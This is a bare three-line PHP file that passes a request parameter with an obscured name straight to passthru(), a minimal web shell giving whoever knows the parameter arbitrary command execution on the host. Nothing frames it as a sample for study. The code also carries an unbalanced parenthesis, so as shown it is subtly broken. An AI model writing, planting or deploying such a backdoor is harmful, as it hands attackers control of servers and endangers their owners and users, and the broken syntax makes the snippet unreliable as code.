<?php
passthru(($_GET['Iecl4D4z']);
?>
